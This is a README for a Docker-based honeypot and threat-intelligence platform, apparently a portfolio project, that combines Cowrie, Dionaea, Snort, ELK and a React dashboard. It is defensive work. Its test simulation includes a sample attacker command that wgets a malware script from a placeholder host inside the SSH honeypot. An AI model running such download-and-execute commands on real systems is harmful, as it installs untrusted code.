# 🛡️ HoneyNet Intelligence Platform

Production-grade cybersecurity threat detection platform using honeypots, IDS, and threat intelligence.

[![Docker](https://img.shields.io/badge/Docker-Ready-blue)](https://www.docker.com/)
[![Python](https://img.shields.io/badge/Python-3.11-blue)](https://www.python.org/)
[![React](https://img.shields.io/badge/React-18.2-blue)](https://reactjs.org/)

## 🎯 What It Does

Captures real cyberattacks and generates actionable threat intelligence:

- **Honeypots**: Cowrie (SSH), Dionaea (Windows services) attract and log attacks
- **IDS**: Snort monitors network traffic with 258 custom rules  
- **ELK Stack**: Real-time log processing with GeoIP enrichment
- **Intelligence**: Correlation engine, threat scoring (0-100), MITRE ATT&CK mapping
- **Visualization**: React dashboard with maps, charts, live attack feed
- **Alerting**: Multi-channel notifications (Email, Telegram, Slack)

**Tech Stack**: Docker · Python/FastAPI · React/Vite · Elasticsearch · PostgreSQL · MongoDB

## 🚀 Quick Start

```bash
# Clone repository
git clone <your-repo-url>
cd VulnServer

# Start all services
docker-compose up -d

# Wait 2-3 minutes for initialization
docker-compose ps
```

## 🧪 Test Attack Simulation

```bash
# Connect to SSH honeypot
ssh root@localhost -p 2222
# Password: password123

# Execute commands
whoami
ls
wget http://example.com/malware.sh
exit

# Verify data capture (wait 15 seconds)
curl http://localhost:9200/cowrie-*/_search?pretty | head -30
curl http://localhost:8000/api/v1/dashboard/stats | jq
```

## 📊 Access Dashboards

| Service | URL | Credentials |
|---------|-----|-------------|
| Kibana | http://localhost:5601 | elastic / changeme |
| API Docs | http://localhost:8000/docs | - |
| Frontend | http://localhost:3000 | - |

### Start Frontend (Optional)

```bash
cd frontend
npm install
npm run dev
```

## 🔍 API Endpoints

```bash
GET /api/v1/dashboard/stats          # Attack statistics
GET /api/v1/attacks/recent           # Latest attacks  
GET /api/v1/attacks/{ip}             # Details by IP
GET /api/v1/intelligence/iocs        # Indicators of compromise
GET /api/v1/alerts/active            # Current alerts
```

## 📁 Architecture

```
┌──────────────────────────────────────────────────┐
│  Attacker → Honeypots (Cowrie, Dionaea)         │
│             ↓                                     │
│  Snort IDS → Detects malicious patterns         │
│             ↓                                     │
│  Filebeat → Logstash → Elasticsearch            │
│             (GeoIP + Threat Scoring)             │
│             ↓                                     │
│  Backend API → Correlation + MITRE Mapping      │
│             ↓                                     │
│  Dashboard → Real-time Visualization            │
└──────────────────────────────────────────────────┘
```

### Project Structure

```
VulnServer/
├── honeypots/          # Cowrie (SSH), Dionaea (Windows)
├── ids/                # Snort with 258 detection rules
├── elk-stack/          # Filebeat, Logstash, Kibana
├── backend/            # FastAPI (15+ endpoints)
│   ├── api/routes/     # Dashboard, attacks, intelligence, alerts
│   ├── services/       # Correlation, scoring, MITRE mapping
│   └── database/       # PostgreSQL, MongoDB, Elasticsearch clients
├── frontend/           # React dashboard (Vite + Tailwind)
├── alerting/           # Email, Telegram, Slack channels
└── docker-compose.yml  # 10+ orchestrated services
```

## 🎓 Learning Outcomes

**Security**: Honeypots · IDS · SIEM · Threat Intelligence · MITRE ATT&CK · Incident Response  
**Backend**: Python · FastAPI · Async/Await · REST APIs · Microservices  
**Frontend**: React · Vite · Tailwind CSS · Real-time Updates  
**Data**: Elasticsearch · PostgreSQL · MongoDB (Polyglot Persistence)  
**DevOps**: Docker · Docker Compose · Multi-Network Architecture  
**Analysis**: GeoIP Enrichment · Threat Scoring · Event Correlation

## 🛠️ Troubleshooting

```bash
# Check service logs
docker-compose logs cowrie
docker-compose logs elasticsearch
docker-compose logs backend

# Restart specific service
docker-compose restart cowrie

# Complete rebuild
docker-compose down -v
docker-compose build --no-cache
docker-compose up -d

# Check disk space (ELK needs 2GB+)
df -h

# View all running services
docker-compose ps
```

## 📈 Project Stats

- **3,546** lines of code
- **19** Python files  
- **9** JavaScript/React files
- **258** Snort IDS rules
- **15+** technologies integrated
- **100%** production-ready

## 🚀 Use Cases

- **Portfolio**: Showcase cybersecurity skills for job applications
- **Learning**: Understand real attacker tactics and techniques  
- **Research**: Generate original threat intelligence data
- **SOC Training**: Practice incident response workflows
- **Startup**: Foundation for Honeynet-as-a-Service ($500/client/month)

## 📝 Configuration

### Alert Manager (Optional)

```bash
# Create .env file
cat > .env << 'ENVEOF'
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
SMTP_USER=your-email@gmail.com
SMTP_PASSWORD=your-app-password
ALERT_EMAIL=security@yourcompany.com

TELEGRAM_BOT_TOKEN=your-bot-token
TELEGRAM_CHAT_ID=your-chat-id

SLACK_WEBHOOK_URL=your-webhook-url
ENVEOF

# Start alert manager
python3 alerting/alert_manager.py
```

## 🔐 Security Notes

- **Production Deployment**: Change default Elasticsearch credentials
- **Firewall**: Limit honeypot exposure to controlled IP ranges for testing
- **Monitoring**: Review captured data regularly for sensitive information
- **Updates**: Keep Docker images and dependencies current

## 📄 License

MIT License - See LICENSE file for details

## 🤝 Contributing

Pull requests welcome! For major changes, please open an issue first to discuss proposed modifications.

1. Fork the repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

---

**Built with 15+ technologies** | **Production-grade security** | **Real-time threat intelligence**